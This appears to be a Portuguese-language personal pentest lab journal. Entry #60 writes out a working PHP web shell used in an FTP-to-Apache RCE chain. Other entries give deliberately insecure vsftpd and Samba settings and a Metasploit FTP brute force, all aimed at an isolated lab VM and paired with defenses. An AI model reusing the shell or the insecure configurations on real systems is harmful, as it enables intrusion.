+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** Servidor Vulnerável (VMware, host Linux Mint)
+
+### Objetivo / Propósito
+Arrancar a Fase 4 do roteiro (exploração de rede/serviços), reaproveitando a VM "Servidor Vulnerável" já existente (que corre DVWA em Docker) em vez de criar uma VM Metasploitable dedicada — e decidir, antes de instalar seja o que for, se os novos serviços vulneráveis desta fase seriam instalados em contentores Docker (como o DVWA) ou diretamente no sistema operativo da VM.
+
+### Ação executada
+1. Ao tentar ligar a VM "Servidor Vulnerável" ("Ubuntu server LAB-segurança"), surgiu o erro `Unable to change virtual machine power state... Cannot open the disk '.../Ubuntu server LAB-segurança-000001.vmdk'... Module 'Disk' power on failed.`
+2. Diagnosticado na pasta da VM, no host (`ls -la`), a presença de três diretórios de bloqueio (`.lck`): `Ubuntu server LAB-segurança-000001.vmdk.lck`, `Ubuntu server LAB-segurança.vmdk.lck` e `Ubuntu server LAB-segurança.vmx.lck` — sinal típico de um encerramento anterior mal feito da VM. Confirmado com `df -h /home` que não era falta de espaço em disco (104G livres).
+3. Confirmado com `ps aux | grep -i "LAB-segurança"` que nenhum processo real estava a usar esses ficheiros de bloqueio (ou seja, eram resíduos, não bloqueios ativos e legítimos).
+4. Removidos os três diretórios `.lck` com `rm -rf`. A VM arrancou com sucesso.
+5. Confirmada rede funcional dentro da VM: `ping -c 3 192.168.10.254` (gateway OPNsense) com 0% de perda de pacotes, hostname da VM confirmado como `lab-seguranca`.
+6. Discutida a abordagem para os serviços vulneráveis desta fase: reaproveitar o padrão Docker já usado no DVWA (rápido, isolado, fácil de repor) ou instalar manualmente serviços antigos/mal configurados diretamente no sistema operativo (mais lento, mas mais fiel a um cenário real e mais didático a nível de configuração de sistema). **Decisão: opção B — instalação manual, não-Docker.**
+
+### Resultado
+VM "Servidor Vulnerável" operacional, com rede confirmada. Fase 4 iniciada com a decisão tomada de instalar os serviços vulneráveis diretamente no sistema operativo (sem contentores).
+
+### Deduções e raciocínio
+A falha de arranque da VM foi uma causa nova, distinta das duas já vistas com o VMware nesta sessão (módulos de kernel em falta, permissões `640` nos ficheiros de índice de módulos): desta vez o problema não estava no VMware Workstation em si, mas em ficheiros de bloqueio (`.lck`) órfãos, deixados por um encerramento anterior da VM que não correu como devia (por exemplo, um encerramento forçado do host). O `ps aux` foi o passo de confirmação decisivo — sem ele, apagar os `.lck` às cegas seria arriscado, porque um processo VMware ainda ativo a usar o disco tornaria essa remoção perigosa (corrupção do disco virtual). Só depois de confirmar "não há ninguém a usar isto" é que a remoção foi seguraa.
+
+Quanto à decisão Docker vs. instalação manual: um contentor Docker isola o serviço vulnerável do resto do sistema operativo, o que é ótimo para rapidez e para repor o ambiente rapidamente (como foi feito com o DVWA), mas esconde uma parte importante da aprendizagem — como um serviço realmente fica mal configurado ao nível do sistema operativo (ficheiros de configuração, permissões, versões de pacotes, utilizadores de sistema). Como o objetivo deste lab é sempre a compreensão passo a passo (e não só "ver o exploit funcionar"), a instalação manual foi escolhida por valor didático, mesmo sendo mais trabalhosa e com maior risco de ser preciso repor a VM manualmente se algo correr mal (ao contrário de um simples `docker rm` no caso do Docker).
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "a VM não arrancava por causa de ficheiros de bloqueio esquecidos de uma vez anterior que não fechei bem; apaguei-os depois de confirmar que nada estava mesmo a usá-los. E para a próxima fase, decidi instalar os serviços vulneráveis a sério no sistema, em vez de usar contentores, porque quero perceber a configuração por dentro, não só correr um exploit contra uma caixa pronta."
+
+### Como nos podemos defender
+Lição de higiene operacional, não de segurança ofensiva/defensiva propriamente dita: encerrar sempre as VMs de forma limpa (não desligar o host ou forçar o encerramento com a VM ligada) evita este tipo de ficheiro de bloqueio órfão. Em ambientes de produção com hipervisores, o equivalente é garantir desligamentos controlados e monitorizar ficheiros de lock esquecidos antes de os remover às cegas.
+
+### Domínios relacionados
+A+ Core 1 D2/D4 (Virtualização, resolução de problemas), Security+ D4 (Operações de Segurança — gestão de configuração e ambientes de teste).
+
+### Próximos passos
+Escolher e instalar o primeiro serviço vulnerável "a sério" (candidato inicial: um FTP antigo tipo `vsftpd 2.3.4`, com vulnerabilidade clássica bem documentada), depois enumeração com `nmap` e exploração com Metasploit, conforme o roteiro da Fase 4.
+
+---
+
+## Entrada #58 — Descoberta: o host está isolado da rede "Ciber" por design (rede do tipo Private Network), Kali confirmado como único ponto de acesso
+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** Servidor Vulnerável, Kali, host (Linux Mint)
+
+### Objetivo / Propósito
+Ligar por SSH à VM "Servidor Vulnerável" para facilitar o trabalho (copiar/colar comandos em vez de escrever na janela da VM). A primeira tentativa foi feita a partir do host, e falhou — o diagnóstico acabou por revelar algo estrutural sobre a arquitetura de rede do lab.
+
+### Ação executada
+1. Tentado `ssh pedro@192.168.10.101` a partir do terminal do host — falhou com `No route to host`.
+2. Confirmado dentro da própria VM que a rede estava bem: `ip a` mostrou o IP correto (`192.168.10.101/24` em `ens33`), SSH ativo (`systemctl status ssh`), e `ping` ao gateway OPNsense (`192.168.10.254`) com 0% de perda.
+3. Testado do lado do host: `ip a` e `ip route` revelaram que o host tem uma interface própria `vmnet3` com IP `192.168.10.1/24` — à partida, na mesma rede. Mas `ping -c 3 192.168.10.101` a partir do host devolveu `Destination Host Unreachable` (falha de resolução ARP, não um simples "porta fechada").
+4. Inspecionado o ficheiro `.vmx` da VM "Servidor Vulnerável" (`grep -i "ethernet0\." ...vmx`), revelando `ethernet0.connectionType = "pvn"` — um tipo de rede "Private Network" (funcionalidade mais recente do VMware Workstation), diferente das redes "Custom" clássicas (`vmnet0`–`vmnet9`). Uma rede deste tipo isola-se do host por definição — não cria um adaptador correspondente no host, ao contrário de uma rede custom clássica. O `vmnet3` visto no host é uma rede diferente (coincidência de intervalo de IP, não o mesmo segmento).
+5. Testado o mesmo `ping` e `ssh` a partir do Kali (que está dentro do segmento "Ciber"): ambos funcionaram de imediato, com o SSH a completar a autenticação e o login com sucesso.
+
+### Resultado
+Confirmado: o host (Linux Mint) não tem, nem pode ter por design, acesso direto à rede "Ciber" onde vivem as VMs do lab. O Kali é o único ponto de acesso funcional a essa rede — o que, de resto, corresponde exatamente ao papel que já lhe tinha sido atribuído desde o início do projeto ("máquina atacante").
+
+### Deduções e raciocínio
+Isto não é uma falha nem um bug — é uma característica do isolamento de rede que o próprio lab sempre pretendeu ("rede interna isolada, sem exposição pública"). A diferença é que a fronteira de isolamento não é só entre o lab e a Internet — é também entre o lab e o próprio computador físico que o aloja. Isso reforça, sem ambiguidade, que qualquer interação com as VMs do segmento "Ciber" (enumeração, exploração, ligação SSH de conveniência) tem de partir de dentro do próprio lab — ou seja, do Kali — e nunca do host. É também um lembrete de que "estar na mesma gama de IPs" não implica "estar na mesma rede" — a arquitetura de virtualização por baixo pode isolar segmentos com o mesmo aspeto de endereçamento.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "tentei ligar-me à VM diretamente do meu computador, mas não consegui, porque a rede do lab foi propositadamente configurada como uma rede privada e isolada até do próprio computador que a aloja — só uma máquina que já esteja dentro dessa rede (o Kali) consegue lá chegar, o que aliás é o comportamento correto para um lab de segurança isolado."
+
+### Como nos podemos defender
+Do ponto de vista de arquitetura de rede, isto é o próprio princípio de defesa em ação: segmentação de rede que restringe o acesso mesmo a partir de sistemas fisicamente próximos (o host) — só quem já está dentro do perímetro correto consegue interagir com os ativos protegidos. É o mesmo princípio usado em ambientes reais para isolar redes de gestão, redes de laboratório, ou segmentos sensíveis de uma rede corporativa.
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — segmentação de rede, isolamento), A+ Core 1 D2 (Redes, virtualização de rede).
+
+### Próximos passos
+Usar sempre o Kali como ponto de partida para SSH, `nmap` e qualquer interação com o Servidor Vulnerável e restantes VMs do segmento "Ciber". Continuar a configuração do `vsftpd` com acesso anónimo mal configurado.
+
+---
+
+## Entrada #59 — Início da Fase 4: vsftpd instalado e configurado com acesso anónimo mal configurado, upload confirmado
+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** Servidor Vulnerável, Kali
+
+### Objetivo / Propósito
+Configurar o primeiro serviço vulnerável da Fase 4 no Servidor Vulnerável, de forma manual (não em Docker, conforme decisão da Entrada #57): um servidor FTP (`vsftpd`) real e atual, mas deliberadamente mal configurado com acesso anónimo de escrita — um tipo de falha de configuração comum em auditorias reais.
+
+### Ação executada
+1. Instalado o `vsftpd` (versão `3.0.5-0ubuntu3.1`, atual, sem qualquer backdoor) via `sudo apt install -y vsftpd`. Serviço arrancou automaticamente (`systemctl status vsftpd` confirmou `active (running)`).
+2. Editado `/etc/vsftpd.conf`, adicionando as diretivas: `anonymous_enable=YES`, `anon_upload_enable=YES`, `anon_mkdir_write_enable=YES`, `anon_other_write_enable=YES`, `write_enable=YES`, `no_anon_password=YES`.
+3. Criada a pasta `/srv/ftp/upload`, com dono `ftp:ftp` e permissões `777` (escrita total).
+4. Reiniciado o serviço (`sudo systemctl restart vsftpd`), sem erros.
+5. Testado o acesso a partir do Kali (`ftp 192.168.10.101`), com utilizador `anonymous` e password vazia — login aceite (`230 Login successful`).
+6. Enviado um ficheiro de teste (`put teste.txt upload/teste.txt`) — transferência completa (`226 Transfer complete`).
+7. Confirmado do lado do servidor (via SSH) que o ficheiro chegou: `ls -la /srv/ftp/upload/` mostrou `teste.txt`, dono `ftp:ftp`, permissões `600`. O `cat` direto falhou por permissões (o `vsftpd` grava uploads anónimos com `600`, só o dono `ftp` pode ler), mas `sudo cat` confirmou o conteúdo exato enviado (`teste de upload anonimo`).
+
+### Resultado
+Servidor FTP funcional no Servidor Vulnerável, com acesso anónimo de escrita ativo e confirmado — um utilizador externo, sem qualquer credencial, consegue autenticar-se e escrever ficheiros no servidor.
+
+### Deduções e raciocínio
+Este processo tocou em dois achados secundários interessantes, para além da vulnerabilidade principal: primeiro, um "falso alarme" inicial (`421 Timeout`) que se revelou apenas o timeout de inatividade do `vsftpd` entre o utilizador e a password (por termos demorado a escrever), não um erro de configuração — uma lição sobre distinguir erros de infraestrutura de erros de timing/ritmo humano. Segundo, o facto de o `cat` falhar por permissões, mesmo com o upload confirmado por `ls -la`, é uma boa lição sobre a diferença entre "o ficheiro existe" e "eu consigo lê-lo" — o `vsftpd` aplica automaticamente um `600` restritivo aos uploads anónimos por segurança, mesmo quando a pasta em si está toda aberta (`777`); a vulnerabilidade real aqui é a possibilidade de escrever, não necessariamente de ler o que outros escreveram.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "configurei um servidor FTP real, mas deixei-o aceitar logins anónimos com permissão de escrita — depois, a partir de outra máquina (o Kali), consegui entrar sem senha nenhuma e enviar um ficheiro para o servidor, e confirmei do lado do servidor que o ficheiro chegou mesmo."
+
+### Como nos podemos defender
+Nunca ativar acesso anónimo de escrita em servidores FTP expostos — se for mesmo necessário acesso anónimo (por exemplo, para distribuição pública de ficheiros), deve ser só de leitura (`anon_upload_enable=NO`). Quando a escrita anónima é mesmo necessária por algum motivo específico, isolar bem a pasta de destino (sem ligação a outras partes sensíveis do sistema, como pastas servidas pela web) e monitorizar/limitar o espaço disponível para evitar abuso.
+
+### Domínios relacionados
+Security+ D2 (Arquitetura — configuração segura de serviços), Security+ D4 (Operações — hardening de serviços), CEH D4 (Enumeração de serviços de rede), A+ Core 2 D2 (Segurança).
+
+### Próximos passos
+Explorar a possibilidade de encadear esta falha com o servidor web do DVWA já existente na mesma VM (se a pasta do FTP anónimo coincidir, ou puder ser configurada para coincidir, com a pasta servida pelo Apache) — subir um ficheiro malicioso por FTP e executá-lo via pedido HTTP, demonstrando uma cadeia de ataque real. Depois, avançar para a enumeração formal com `nmap` a partir do Kali.
+
+---
+
+## Entrada #60 — Cadeia de ataque completa: FTP anónimo + Apache mal configurado = RCE via upload de web shell PHP
+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** Servidor Vulnerável, Kali
+
+### Objetivo / Propósito
+Completar o cenário didático iniciado na Entrada #59: em vez de tratar o `vsftpd` mal configurado como uma falha isolada, encadeá-la com um segundo serviço (um servidor web) para demonstrar uma cadeia de ataque real — upload anónimo de um ficheiro malicioso, seguido da sua execução via um pedido HTTP normal.
+
+### Ação executada
+1. Verificado que o container Docker do DVWA não tinha `Mounts` (`docker inspect dvwa --format '{{json .Mounts}}'` devolveu `[]`) — ou seja, a raiz web do DVWA vive isolada dentro do próprio container, sem pasta correspondente no sistema operativo da VM. Decidido, por isso, montar um servidor web novo e independente (não em Docker) para a demonstração, em vez de tentar usar o DVWA.
+2. Instalado `apache2` e `libapache2-mod-php` via `apt`. Falha inicial ao arrancar (`Address already in use: could not bind to address 0.0.0.0:80`), porque a porta 80 já estava ocupada pelo container do DVWA — resolvido mudando o Apache para a porta `8080` (`/etc/apache2/ports.conf` e `<VirtualHost *:8080>` em `000-default.conf`).
+3. Configurado `DocumentRoot /srv/ftp/upload` no Apache — apontando a raiz web exatamente para a mesma pasta onde o FTP anónimo escreve.
+4. Primeira tentativa de acesso (`curl http://192.168.10.101:8080/teste.txt`) devolveu `403 Forbidden` — causa: a regra global do Apache (`apache2.conf`) nega acesso, por defeito, a qualquer pasta fora de `/var/www/`. Corrigido adicionando um bloco `<Directory /srv/ftp/upload> Require all granted </Directory>` no site.
+5. Segunda tentativa ainda falhou, mas com um erro diferente no log (`file permissions deny server access`) — o ficheiro `teste.txt`, criado antes por upload anónimo, tinha permissões `600` (só o dono `ftp` podia ler), impedindo o utilizador `www-data` do Apache de o servir. Diagnosticado com `namei -l`, que mostrou a cadeia de permissões completa até ao ficheiro.
+6. Identificada a causa: o `vsftpd` aplica um `umask` restritivo (`077`) por defeito aos uploads anónimos, precisamente para dificultar este tipo de cadeia. Adicionada uma segunda má configuração deliberada — `anon_umask=022` em `/etc/vsftpd.conf` — e reiniciado o serviço.
+7. Confirmado com um novo upload (`teste2.txt`) que as permissões passaram a `644` (`rw-r--r--`), legíveis por todos. `curl http://192.168.10.101:8080/teste2.txt` devolveu o conteúdo do ficheiro com sucesso.
+8. Criado um mini web shell (`<?php echo shell_exec($_GET["cmd"]); ?>`), enviado por FTP anónimo como `shell.php`, e acedido via `curl "http://192.168.10.101:8080/shell.php?cmd=whoami"` — resposta: `www-data`, confirmando execução de comandos arbitrários no servidor.
+
+### Resultado
+Cadeia de ataque completa e confirmada: um atacante sem qualquer credencial consegue, a partir de fora, escrever um ficheiro PHP no servidor via FTP anónimo e executar código arbitrário nele através de um pedido HTTP normal, obtendo execução de comandos com o utilizador `www-data`.
+
+### Deduções e raciocínio
+Esta entrada tem um valor didático que nenhuma das vulnerabilidades isoladas tinha sozinha: nenhuma das duas más configurações — escrita anónima por FTP, ou um Apache a servir uma pasta partilhada — é, por si só, suficiente para o ataque funcionar por completo (o `vsftpd` protege os uploads anónimos com um `umask` restritivo por defeito, o que só de si já travaria a cadeia). Foi preciso empilhar deliberadamente **duas** más configurações distintas para chegar ao RCE: acesso de escrita anónimo + `umask` relaxado nos uploads. Isto espelha como falhas de segurança reais raramente vêm de um único erro óbvio — são mais frequentemente combinações de pequenas decisões de configuração, cada uma aparentemente inofensiva isoladamente, que juntas abrem uma cadeia de exploração completa. A escolha de não usar o DVWA (por estar isolado num container Docker sem pasta partilhada) também reforçou uma lição sobre isolamento de containers: mesmo o próprio administrador do sistema tem dificuldade em alcançar diretamente o sistema de ficheiros interno de um container sem uma montagem de volume explícita.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "consegui enviar um ficheiro PHP através de um login anónimo no FTP, e depois, só por pedir esse ficheiro através do browser (ou `curl`), o servidor executou o código PHP dentro dele — isso deu-me a capacidade de correr qualquer comando no servidor, tudo isto sem nunca ter tido uma password."
+
+### Como nos podemos defender
+Múltiplas camadas de defesa quebrariam esta cadeia em qualquer ponto: (1) nunca ativar escrita anónima em FTP; (2) mesmo quando é necessária, nunca fazer coincidir a pasta de destino do FTP com uma pasta servida pela web; (3) desativar a execução de PHP (ou qualquer linguagem de servidor) em pastas de upload, através de diretivas como `php_admin_flag engine off` num bloco `<Directory>` dedicado, ou restringindo por extensão; (4) aplicar o princípio do menor privilégio nas permissões de ficheiros — mesmo que a pasta seja de escrita livre, os ficheiros não precisam de ser legíveis por todos os utilizadores do sistema. Esta é a mesma lição de defesa em profundidade já vista nos módulos File Upload do DVWA (Entradas #37–#39), agora aplicada a uma cadeia entre dois serviços de sistema em vez de dentro de uma única aplicação web.
+
+### Domínios relacionados
+Security+ D2/D4 (Arquitetura e Operações — hardening de serviços, defesa em profundidade), CEH D4 (Enumeração de serviços), CEH D5 (Análise de vulnerabilidades), A+ Core 2 D2 (Segurança).
+
+### Próximos passos
+Avançar para a enumeração formal com `nmap` a partir do Kali, cobrindo todos os serviços agora expostos nesta VM (FTP, HTTP na 8080, e os que já existiam do DVWA na 80), como exercício de reconhecimento antes de qualquer exploração adicional via Metasploit.
+
+---
+
+## Entrada #61 — Enumeração formal com nmap do Servidor Vulnerável
+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** Servidor Vulnerável, Kali
+
+### Objetivo / Propósito
+Fazer um levantamento formal e completo dos serviços expostos no Servidor Vulnerável, como se fosse o primeiro contacto com a máquina (fase de reconhecimento), sem assumir à partida o que já sabemos ter configurado nós próprios.
+
+### Ação executada
+Executado, a partir do Kali:
+```
+nmap -sV -p- 192.168.10.101
+```
+(`-sV` deteta versão dos serviços; `-p-` varre as 65535 portas TCP, para não deixar nada por descobrir por causa de um scan rápido só às portas mais comuns).
+
+### Resultado
+Quatro portas abertas, todas identificadas corretamente:
+- `21/tcp` — `vsftpd 3.0.5` (o FTP mal configurado da Entrada #59)
+- `22/tcp` — `OpenSSH 9.6p1 Ubuntu 3ubuntu13.18`
+- `80/tcp` — `Apache httpd 2.4.25 ((Debian))` (o container do DVWA)
+- `8080/tcp` — `Apache httpd 2.4.58` (o Apache novo da Entrada #60, apontado para a pasta do FTP)
+
+O `nmap` também identificou o sistema operativo como Linux/Unix e reportou o hostname interno `127.0.1.1` a partir do banner do Apache.
+
+### Deduções e raciocínio
+Este scan confirma, de fora e sem qualquer conhecimento prévio, exatamente os quatro serviços que fomos configurando ao longo da sessão — o que é uma boa validação de que a enumeração funciona como esperado antes de avançarmos para exploração ativa. Há um detalhe interessante: o banner do Apache na porta 80 identifica-se como `2.4.25 ((Debian))`, uma versão mais antiga que a do Apache novo na 8080 (`2.4.58`, sem indicação de distribuição) — isto é uma pista visível de que estes dois serviços não correm no mesmo ambiente de base (o `80` está dentro do container Docker do DVWA, com a sua própria imagem Debian mais antiga; o `8080` corre diretamente no Ubuntu 24.04 da VM). Um atacante real, só com este scan, já teria informação suficiente para procurar exploits específicos de cada versão reportada (por exemplo, via `searchsploit` ou bases de dados como o Exploit-DB) — o que é exatamente o próximo passo lógico do processo de reconhecimento.
+
+Vale a pena notar que este `nmap` não escondeu nada nem foi bloqueado por nenhuma firewall (nem no lado do Servidor Vulnerável, nem no OPNsense) — todas as portas reais aparecem, o que é esperado num ambiente de laboratório sem hardening propositado. Em produção, ferramentas de deteção de scans agressivos (IDS/IPS) e regras de firewall mais restritivas tipicamente limitariam ou alertariam sobre um scan destes.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "corri uma varredura de todas as portas TCP contra o servidor, e sem saber nada de antemão, o nmap revelou-me automaticamente os quatro serviços que lá estavam a correr, com as versões exatas de cada um — informação suficiente para começar a procurar vulnerabilidades específicas de cada versão."
+
+### Como nos podemos defender
+Reduzir a superfície de ataque visível: fechar/filtrar portas não necessárias externamente (uma firewall de host, como o `ufw`, ou regras no gateway), desativar banners detalhados de versão sempre que possível (`ServerTokens Prod` no Apache, por exemplo, para não anunciar a versão exata), e usar deteção de scans agressivos (IDS/IPS) como sinal de alerta precoce de reconhecimento hostil.
+
+### Domínios relacionados
+CEH D3/D4 (Reconhecimento e Enumeração), Security+ D4 (Operações de Segurança — deteção e monitorização), A+ Core 2 D2 (Segurança de rede).
+
+### Próximos passos
+Usar as versões identificadas para procurar vulnerabilidades conhecidas (por exemplo, `searchsploit apache 2.4.25` ou `searchsploit vsftpd`), e avançar depois para a exploração formal com o Metasploit Framework.
+
+---
+
+## Entrada #62 — Investigação do Optionsbleed (CVE-2017-9798) no Apache do DVWA: bug relacionado confirmado, vulnerabilidade principal não reproduzida
+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** Servidor Vulnerável, Kali
+
+### Objetivo / Propósito
+A partir do resultado do `nmap` (Entrada #61), investigar se o Apache antigo (`2.4.25`) dentro do container do DVWA era vulnerável ao Optionsbleed (CVE-2017-9798) — uma vulnerabilidade real de divulgação de memória, ao contrário das más configurações anteriores (que fomos nós a criar de propósito).
+
+### Ação executada
+1. Localizado o exploit/PoC com `searchsploit apache 2.4.25` e `searchsploit vsftpd` — nenhum exploit correspondia exatamente à versão do `vsftpd` instalado (`3.0.5`), mas o Apache `2.4.25` caía no intervalo afetado pelo Optionsbleed (`< 2.4.27`).
+2. Copiado o script de PoC (`searchsploit -m linux/webapps/42745.py`) e revisto o código antes de correr, por boa prática.
+3. Primeira tentativa (`-u http://192.168.10.101/`) não devolveu qualquer output — diagnosticado no próprio código do script um detalhe de lógica: o modo `-u` só faz **um único pedido**, ignorando o parâmetro `-n` (repetições). Esse único pedido caiu num `302 Found` (redirecionamento para `login.php`, comportamento normal do DVWA), que não tem cabeçalho `Allow`.
+4. Testado manualmente com `curl -X OPTIONS` contra `/` e `/login.php` — ambos processados pelo PHP (que não distingue métodos HTTP), sem gerar cabeçalho `Allow` nunca, porque o pedido nunca chega à parte do Apache que o geraria.
+5. Testado contra um recurso estático não processado por PHP (`/dvwa/css/login.css`) — aí sim apareceu um cabeçalho `Allow: OPTIONS,HEAD,HEAD,GET,HEAD,POST`, com `HEAD` repetido três vezes (anomalia).
+6. Repetido o mesmo pedido 20 vezes em sequência — resultado sempre idêntico, byte a byte.
+7. Repetido o mesmo pedido 50 vezes **em simultâneo** (concorrência real, via `&`/`wait` em `bash`), para dar a oportunidade certa à condição de corrida que causa o Optionsbleed — resultado: as 50 respostas continuaram todas com exatamente o mesmo valor, sem qualquer variação ou corrupção.
+
+### Resultado
+Confirmado um bug relacionado mas distinto (duplicação determinística de métodos no cabeçalho `Allow`, associado ao Apache bug #61207) — sem impacto de segurança por si só. A vulnerabilidade principal investigada (Optionsbleed, divulgação de memória via condição de corrida) **não foi reproduzida** neste ambiente, mesmo sob concorrência real.
+
+### Deduções e raciocínio
+O Optionsbleed depende de uma condição muito específica: normalmente, ficheiros `.htaccess` com diretivas `Limit`/`LimitExcept` contraditórias entre vários blocos de configuração, que desencadeiam uma libertação de memória prematura (*use-after-free*) sob concorrência. A imagem Docker do DVWA usada aqui, apesar de correr uma versão de Apache no intervalo tecnicamente afetado, não parece ter essa configuração específica presente — daí o cabeçalho ser sempre consistente, mesmo sob 50 pedidos simultâneos. Isto é uma boa lição sobre a diferença entre "a versão de software é vulnerável" e "a vulnerabilidade é explorável nesta instalação em concreto": ter o número de versão certo é uma condição necessária, mas não suficiente — a configuração real também tem de reunir as condições precisas para o bug se manifestar. Vale a pena documentar isto como um resultado negativo honesto, em vez de forçar uma conclusão de sucesso que os dados não suportam.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "tentei explorar uma vulnerabilidade conhecida de fuga de memória numa versão antiga do Apache; encontrei um sintoma parecido, mas relacionado com um bug diferente e sem gravidade, e mesmo bombardeando o servidor com pedidos simultâneos não consegui provocar a fuga de memória real — o que me ensinou que ter a versão de software vulnerável não significa automaticamente que o ataque específico funcione."
+
+### Como nos podemos defender
+Manter software atualizado continua a ser a defesa primária (versões posteriores ao `2.4.27` corrigem este bug na origem). Para além disso, este caso reforça o valor de testes de penetração reais sobre simples correspondência de versões (*version matching*) — scanners automáticos que só comparam números de versão podem sinalizar falsos positivos de risco que não se confirmam na prática, e o inverso também é possível.
+
+### Domínios relacionados
+CEH D5 (Análise de vulnerabilidades — diferença entre vulnerabilidade teórica e exploração prática), Security+ D4 (Operações — gestão de patches), A+ Core 2 D2 (Segurança).
+
+### Próximos passos
+Encerrar esta investigação lateral e avançar para o exercício planeado com o Metasploit Framework: um módulo de ataque de credenciais (`ftp_login` ou `ssh_login`) contra os serviços configurados nesta VM.
+
+---
+
+## Entrada #63 — Ataque de força bruta a credenciais FTP com o Metasploit Framework (auxiliary/scanner/ftp/ftp_login)
+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** Servidor Vulnerável, Kali
+
+### Objetivo / Propósito
+Fechar a Fase 4 com o exercício originalmente planeado: usar o Metasploit Framework para um ataque formal de força bruta a credenciais, desta vez contra um utilizador de sistema real (autenticado, não anónimo) no serviço FTP.
+
+### Ação executada
+1. Criado no Servidor Vulnerável um utilizador de teste dedicado a este exercício, `testftp`, com uma password propositadamente fraca (`123456`) — em vez de tentar adivinhar a password real do utilizador `pedro`, o que seria arriscado e desnecessário.
+2. Preparadas, no Kali, duas listas pequenas: `users.txt` (com `testftp` escondido entre outros nomes plausíveis — `admin`, `pedro`, `root`) e `passwords.txt` (com `123456` escondida entre outras passwords comuns — `password`, `admin123`, `letmein`, `qwerty`).
+3. Aberto o `msfconsole` e selecionado o módulo `auxiliary/scanner/ftp/ftp_login`.
+4. Configurados os parâmetros: `RHOSTS 192.168.10.101`, `USER_FILE`/`PASS_FILE` com as listas criadas, `STOP_ON_SUCCESS true` (para parar assim que encontrasse uma combinação válida, em vez de continuar a testar sem necessidade).
+5. Executado com `run` — o módulo tentou várias combinações (`admin:password`, `admin:123456`, `admin:admin123`, `admin:letmein`, `admin:qwerty`, `testftp:password`), todas falhadas, até encontrar `testftp:123456` com sucesso na 7ª tentativa.
+
+### Resultado
+Credencial válida descoberta por força bruta automatizada: `testftp` / `123456`. O Metasploit confirmou o login com `[+] Login Successful`.
+
+### Deduções e raciocínio
+Este exercício fecha o ciclo formal da Fase 4 com a ferramenta que o roteiro sempre previu (Metasploit Framework), depois de termos já explorado más configurações manuais (Entradas #59–#60) e uma vulnerabilidade de versão que não se confirmou na prática (Entrada #62). A diferença central deste ataque, em relação aos anteriores, é que aqui não há nenhuma "falha de configuração" a explorar — a única fraqueza é a escolha de uma password fraca e previsível por parte do utilizador. É um lembrete de que muitas invasões reais não dependem de exploits sofisticados de software, mas simplesmente de credenciais fracas ou reutilizadas, encontradas por ferramentas de força bruta simples e automatizadas como esta.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "usei o Metasploit para testar várias combinações de utilizador e password contra o servidor FTP, com listas pequenas mas realistas, e a ferramenta encontrou sozinha a combinação certa numa das primeiras tentativas — isto mostra como passwords fracas e previsíveis são muitas vezes o elo mais fraco de um sistema, mais do que falhas de software."
+
+### Como nos podemos defender
+Políticas de password fortes e obrigatórias (comprimento mínimo, complexidade), bloqueio de conta após um número limitado de tentativas falhadas (proteção contra força bruta), autenticação multifator sempre que possível, e monitorização/alerta de múltiplas tentativas de login falhadas num curto espaço de tempo (deteção de força bruta ativa).
+
+### Domínios relacionados
+CEH D6 (Ataques ao Sistema — força bruta, quebra de passwords), Security+ D2/D4 (Arquitetura e Operações — políticas de autenticação), A+ Core 2 D2 (Segurança).
+
+### Próximos passos
+**Fase 4 encerrada por hoje**, com três resultados concretos: (1) cadeia de ataque FTP anónimo → RCE via Apache (Entradas #59–#60), (2) investigação honesta de uma vulnerabilidade de versão sem confirmação prática (Entrada #62), e (3) força bruta de credenciais bem-sucedida com Metasploit (esta entrada). Continuar a Fase 4 numa próxima sessão (mais serviços a enumerar/explorar), ou avançar para a Fase 5 (Windows Server, hardening, deteção — Wazuh), conforme prioridade a decidir.
+
+---
+
+## Entrada #64 — Samba com partilha anónima mal configurada, enumeração e upload confirmados a partir do Kali
+**Data/hora:** 2026-08-23
+**Máquinas ligadas:** Servidor Vulnerável, Kali
+
+### Objetivo / Propósito
+Repetir, noutro protocolo, o mesmo tipo de exercício já feito com o FTP (Entrada #59): configurar deliberadamente um serviço de partilha de ficheiros (Samba) com acesso anónimo mal protegido, e confirmar a partir do Kali que é possível enumerar e escrever na partilha sem qualquer credencial.
+
+### Ação executada
+1. Instalado o `samba` via `apt`. O `apt` avisou sobre uma atualização de kernel pendente (`6.8.0-138-generic`), sem relação com o exercício — não tratado nesta entrada.
+2. Criada a pasta `/srv/samba/publico` com permissões `777`.
+3. Adicionado ao `/etc/samba/smb.conf` um novo bloco de partilha:
+   ```
+   [publico]
+      path = /srv/samba/publico
+      browseable = yes
+      read only = no
+      guest ok = yes
+      guest only = yes
+   ```
+   (`guest ok = yes` permite acesso sem autenticação; `guest only = yes` força esse acesso anónimo mesmo que sejam fornecidas credenciais; `read only = no` permite escrita.)
+4. Reiniciado o serviço (`sudo systemctl restart smbd`) — arrancou sem erros (só um aviso inofensivo do `systemd` sobre uma variável de ambiente `SMBDOPTIONS` não definida, sem impacto funcional).
+5. A partir do Kali, confirmado com `nmap -p 139,445 -sV 192.168.10.101` que o Samba estava exposto nas duas portas clássicas do protocolo (139 — NetBIOS Session Service; 445 — SMB direto sobre TCP/IP).
+6. Listadas as partilhas disponíveis sem qualquer credencial: `smbclient -L //192.168.10.101/ -N` — revelou a partilha `publico`, para além das partilhas administrativas padrão (`print$`, `IPC$`).
+7. Ligado à partilha (`smbclient //192.168.10.101/publico -N`) e testada escrita: `put testesamba.txt`, seguido de `ls` — ficheiro confirmado na partilha remota (`20` bytes, atributo `A`).
